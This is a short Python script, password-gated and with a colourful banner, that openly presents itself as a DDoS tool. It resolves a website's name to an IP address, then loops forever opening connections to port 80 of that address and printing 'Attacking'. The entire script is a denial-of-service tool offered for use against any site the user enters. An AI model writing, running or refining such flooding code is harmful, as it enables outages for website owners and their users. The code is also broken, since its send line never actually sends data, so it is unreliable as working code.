A = '\033[1;31m' #احمر  
B = '\033[1;32m' #اخضر 
C = '\033[1;33m' #اصفر 
D = '\033[1;34m' #بنفسجي
E = '\033[1;35m' #وردي 
F = '\033[1;36m' #سمائي 
G = '\033[1;37m' #ابيض
print('\x1b[1;36m░░'*60)
print('\x1b[1;36m '*60)
import requests,sys,os,time

yso = 'Al_SafaH'

pss=input("\033[1;37m [~]\037 ENTER PASSWORD :\033[1;33m")
if pss ==yso:
 pass
 print("\033[1;32m »»»»»»»»»»»»»»»»»»»Correct Password«««««««««««««««««")
 print('\033[1;36m░░'*60)
 time.sleep(1)
 os.system('clear')
else:
 exit('\033[1;31m ----------------------Wrong Password--------------------- ,----------------\033[1;32mPlease Exit And Try Again\033[1;31m-------------------')
 
 
 
print(D+'< '*30)
print("\033[1;35m            __    _   ____         __       _   _")
print('\033[1;36m           / \   | | / ___|  __ _ / _| __ _| | | |''')
print('\033[1;34m          / _ \  | | \___ \ / _` | |_ / _` | |_| |''')
print("\033[1;33m         /.___\  | |  ___) | (_| |  _| (_| |  _  |")
print('\033[1;31m        /_/   \_ \_| |____/ \__,_|_|  \__,_|_| |_|''')
print(' ')
print(D+'> '*30)
 
import socket 
#&#&#&#&#&#&#&#&#&#&#
print ('  \033[1;37m==> Enter Your Website Name To Get\033[1;33m IP \033[1;37m:            '  '\033[1;35m')
#&#&#&#&#&#&#&#&#&#&#
hostname = input()
ip=socket.gethostbyname(hostname)
#&#&#&#&#&#&#&#&#&#&#
print (' \033[1;32m  TARGET :' +hostname)
print('    \033[1;33mIP  :' +ip)

import socket
ip=input("\033[1;37m   Enter \033[1;33mIP \033[1;37m Website \033[1;36mTo Start Ddos Attack:\033[1;33m")
while True:
    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    socket.setdefaulttimeout(1)
    conn=sock.connect((ip,80))
    data="jdksjdkdjskjkdjskjdksjdksjdskkdsj"*1000
    sock.send,(data)
    print ("Attacking for ip",ip,"port 80")